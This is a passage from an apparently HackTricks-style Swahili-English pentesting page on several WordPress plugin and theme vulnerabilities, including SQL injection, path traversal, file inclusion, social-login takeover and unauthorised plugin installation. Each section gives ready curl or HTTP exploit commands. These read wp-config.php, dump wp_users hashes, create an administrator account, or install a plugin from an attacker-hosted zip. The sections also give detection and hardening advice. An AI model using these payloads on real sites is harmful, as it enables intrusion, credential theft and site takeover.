$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Masuala yaliyotokana na kipande hiki cha msimbo:

1. **Unsanitised user input** – `parentid` inatoka moja kwa moja kutoka kwenye ombi la HTTP.
2. **String concatenation inside the WHERE clause** – hakuna `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** – ingawa action inatekelezwa kupitia `admin-post.php`, ukaguzi pekee uliopo ni **CSRF nonce** (`wp_verify_nonce()`), ambao mgeni yeyote anaweza kuipata kutoka kwenye ukurasa wa umma unaojumuisha shortcode `[wpjobportal_my_resumes]`.

#### Exploitation

1. Chukua nonce mpya:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Weka SQL yoyote kwa kutumia vibaya `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Jibu linafunua matokeo ya query iliyotiwa au linabadilisha database, kuthibitisha SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Kazi nyingine, **downloadcustomfile**, iliwaruhusu wageni kupakua **any file on disk** kupitia path traversal. Sink dhaifu iko katika `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` inayodhibitiwa na mshambuliaji na inachanganywa **bila kusafishwa**. Tena, kizuizi pekee ni **CSRF nonce** ambayo inaweza kupatikana kutoka ukurasa wa resume.

#### Utekelezaji
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Seva inarejesha yaliyomo ya `wp-config.php`, leaking DB credentials and auth keys.

## Uchukuzi wa akaunti bila uthibitisho kupitia Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Mandhari/plugini nyingi huja na "social login" helpers zilizoonyeshwa kupitia admin-ajax.php. Ikiwa action ya AJAX bila uthibitisho (wp_ajax_nopriv_...) itaamini client-supplied identifiers wakati provider data inakosekana na kisha itaita wp_set_auth_cookie(), hili linakuwa full authentication bypass.

Mfano wa kawaida wa muundo mbovu (umewekwa kwa ufupi)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider – execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // 🔥 logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Kwa nini inaweza kutumika

- Unauthenticated reachability via admin-ajax.php (wp_ajax_nopriv_… action).
- Hakuna ukaguzi wa nonce/capability kabla ya mabadiliko ya hali.
- Uthibitisho wa OAuth/OpenID provider umekosekana; default branch inakubali attacker input.
- get_user_by('email', $_POST['id']) ikifuatiwa na wp_set_auth_cookie($uid) inamtambulisha muomba kama anuani yoyote ya barua pepe iliyopo.

Exploitation (unauthenticated)

- Mahitaji ya awali: attacker anaweza kufikia /wp-admin/admin-ajax.php na anajua/anakisia anwani halali ya barua pepe ya mtumiaji.
- Weka provider kuwa thamani isiyoungwa mkono (au uiache) ili kufikia default branch na upitishie id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Viashiria vilivyotarajiwa vya mafanikio

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Kupata jina la action

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Orodha ya kugundua

- Web logs showing unauthenticated POSTs to /wp-admin/admin-ajax.php with the social-login action and id=<email>.
- 200 responses with the success JSON immediately preceding authenticated traffic from the same IP/User-Agent.

Kuimarisha

- Usitafsiri utambulisho kutoka kwa pembejeo ya client. Kubali tu emails/IDs zinazoanzishwa na provider token/ID iliyothibitishwa.
- Require CSRF nonces and capability checks even for login helpers; avoid registering wp_ajax_nopriv_ unless strictly necessary.
- Thibitisha na hakiki majibu ya OAuth/OIDC upande wa server; kataa providers zisizopo au zisizo halali (usiwe na fallback kwa POST id).
- Fikiria kuzima kwa muda social login au kufanya virtual patching upande wa edge (zuia action iliyo dhaifu) hadi itakaposahihishwa.

Tabia iliyorekebishwa (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ≤ 1.0.82)

Baadhi ya plugins zinaonyesha REST endpoints zinazotengeneza reusable “connection keys” au tokens bila kuthibitisha uwezo wa aliyeomba. Ikiwa route inathibitisha tu kwa sifa inayoweza kukisia (mfano, username) na haifungishi key kwa user/session yenye capability checks, mshambuliaji yeyote asiye authenticated anaweza kutengeneza key na kuita vitendo vyenye haki za juu (kuunda account ya admin, plugin actions → RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC – tengeneza connection key na uitumie
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# → {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Kwa nini inaweza kutumiwa
- REST route nyeti inalindwa tu na uthibitisho wa utambulisho wa entropi ya chini (username) au permission_callback inayokosekana
- Hakuna utekelezaji wa capability; funguo iliyotengenezwa inakubaliwa kama bypass ya jumla

Orodha ya utambuzi
- Grep code ya plugin kwa register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- Route yoyote inayotoa tokens/keys msingi kwenye utambulisho uliowezwa na ombi (username/email) bila kuhusisha na mtumiaji aliyethibitishwa au capability
- Angalia routes zilizofuata zinazokubali token/key iliyotengenezwa bila ukaguzi wa capability upande wa server

Kuimarisha usalama
- Kwa REST route yoyote yenye privileges: hitaji permission_callback inayotekeleza current_user_can() kwa capability inayohitajika
- Usitengeneze funguo zenye muda mrefu kutoka kwa utambulisho uliotolewa na mteja; ikiwa inahitajika, toa tokens fupi-muda, zenye uhusiano na mtumiaji baada ya authentication na ukague tena capabilities wakati wa matumizi
- Thibitisha muktadha wa mtumiaji wa mpiga wito (caller) (wp_set_current_user haitoshi peke yake) na kata maombi ambapo !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse → unauthenticated arbitrary plugin installation (FunnelKit Automations ≤ 3.5.3)

Nonces zinazuia CSRF, si uthibitisho wa ruhusa. Ikiwa code itachukulia kupitishwa kwa nonce kama kibali na kisha kuruka ukaguzi wa capability kwa operesheni zenye ruhusa (mf., install/activate plugins), washambuliaji wasio na uthibitisho wanaweza kukidhi mahitaji dhaifu ya nonce na kufikia RCE kwa kusakinisha plugin backdoored au yenye udhaifu.

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce “passes”
- Impact: full compromise via arbitrary plugin install/activation

PoC (umbo hutegemea plugin; ni kwa mfano tu)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers zinazobadilisha plugins/themes kwa kutumia tu wp_verify_nonce()/check_admin_referer() na bila capability check
- Njia yoyote ya code inayoweka $skip_caps = true baada ya nonce validation

Hardening
- Daima tibu nonces kama tokeni za CSRF pekee; lazimisha capability checks bila kujali hali ya nonce
- Lazimisha current_user_can('install_plugins') na current_user_can('activate_plugins') kabla ya kufikia installer code
- Kataa ufikiaji usioathibitishwa; epuka kufichua nopriv AJAX actions kwa mifereji inayohitaji ruhusa

---

## SQLi bila uthibitisho kupitia parameter ya s (search) katika depicter-* actions (Depicter Slider ≤ 3.6.1)

Vitendo kadhaa za depicter-* zilitumia parameter s (search) na kuichanganya ndani ya maswali ya SQL bila parameterization.

- Kigezo: s (search)
- Hitilafu: kuunganisha mnyororo wa maandishi moja kwa moja katika WHERE/LIKE clauses; hakuna prepared statements/sanitization
- Athari: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Grep for depicter-* action handlers and direct use of $_GET['s'] or $_POST['s'] in SQL
- Pitia custom queries zinazopitishwa kwa $wpdb->get_results()/query() zinazochanganya s

Hardening
- Tumia kila mara $wpdb->prepare() au wpdb placeholders; kataa metacharacters zisizotarajiwa upande wa server
- Ongeza allowlist kali kwa s na linganisha hadi charset/length inayotarajiwa

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder ≤ 2.5.1)

Kukubali paths zinazosimamiwa na mshambuliaji katika parameter ya template bila normalisation/containment kunaruhusu kusoma faili za ndani yoyote, na wakati mwingine code execution ikiwa faili za PHP/log zinazoweza kujumuishwa zitaletwa wakati wa runtime.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: hakuna normalisation/allowlisting; traversal umewezekana
- Impact: ufichuaji wa siri (wp-config.php), uwezekano wa RCE katika mazingira maalum (log poisoning, includable PHP)

PoC – soma wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Orodha ya utambuzi
- Any handler anayechanganya request paths ndani ya include()/require()/read sinks bila realpath() containment
- Tafuta traversal patterns (../) zinazofikia nje ya templates directory iliyokusudiwa

Uimarishaji
- Lazimisha allowlisted templates; tatua kwa realpath() na require str_starts_with(realpath(file), realpath(allowed_base))
- Normaliza input; kataa traversal sequences na absolute paths; tumia sanitize_file_name() only for filenames (not full paths)


## Marejeo

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025’s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ≤ 1.0.82 – Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ≤ 3.5.3 – Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ≤ 3.6.1 – Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ≤ 2.5.1 – Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
